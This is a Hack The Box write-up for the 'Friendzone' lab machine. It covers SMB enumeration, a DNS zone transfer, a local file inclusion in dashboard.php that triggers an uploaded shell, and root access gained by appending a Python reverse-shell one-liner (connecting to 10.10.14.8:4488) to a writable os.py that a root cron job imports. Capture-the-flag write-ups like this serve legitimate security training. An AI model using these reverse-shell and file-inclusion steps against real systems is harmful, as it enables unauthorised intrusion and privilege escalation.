---
layout: single
title: Friendzone - Hack The Box
excerpt: "N/A"
date: 2019-06-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: false
categories:
  - hackthebox
tags:  
  - linux
  - easy
  - smb
  - zone transfer
  - lfi
  - pspy64
  - file permissions
---

![](/assets/images/htb-writeup-friendzone/friendzone_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

N/A<br><br><br><br><br><br><br>

----------------


# USER
## Enumeration

Enum standard + extra smb
```bash
nmap -sC -sV -O 10.10.10.123
nmap --script=smb-enum-shares 10.10.10.123 
```

Grab `cred.txt`
```bash
smbclient //10.10.10.123/general
get creds.txt
```

Zone Transfer to find subdomains
```bash
dig axfr friendzone.red @10.10.10.123
```

Add subdomains to `/etc/hosts`
```bash
10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

Login as `administrator1` with credentials found from `cred.txt`

Upload reverse shell through SMB
```bash
smbclient //10.10.10.123/Development
put r
```

Prepare `nc` to grab reverse shell
```bash
nc -lnvp 4455
```

Use LFI through dashboard.php to trigger reverse shell.<br>
With previous enumeration of smb shares we found the path to `/etc/Development` where our shell will be uploaded.

`dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r`

> **NOTE1:**<br>
> Probably smart to upload a test file, like `<?php phpinfo(); ?>`, before going for the reverse shell.


> **NOTE2:**<br>
> The php call will look something like this: `<?php “include/”.include($_GET['pagename'].“.php”); ?>`<br>
> Do not end your filename with `.php` as this is already done in the code and you'll create a double file ending. 

Grab user: `/home/friend/user.txt`

Grab SSH-creds:
```bash
ls /var/www/htm/mysql_data.conf
(f*****:A*************)
```

---------
<br><br>

# ROOT

```bash
ssh friend@10.10.10.123
```

Look on executing services with `pspy64`:
```bash
2019/06/18 16:24:01 CMD: UID=0    PID=4059   | /bin/sh -c /opt/server_admin/reporter.py 
2019/06/18 16:24:01 CMD: UID=0    PID=4058   | /bin/sh -c /opt/server_admin/reporter.py 
2019/06/18 16:24:01 CMD: UID=0    PID=4057   | /usr/sbin/CRON -f 
```

Investigate the script `reporter.py` and we find that it uses `import os`.


With ls -l1 we find that we have `+r+w` one the file `/usr/lib/python2.7/os.py`

Add a python reverse shell at the end of `os.py` and wait for cron to trigger it.
```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Start `nc -lvnp 4488` and grab `root.txt`
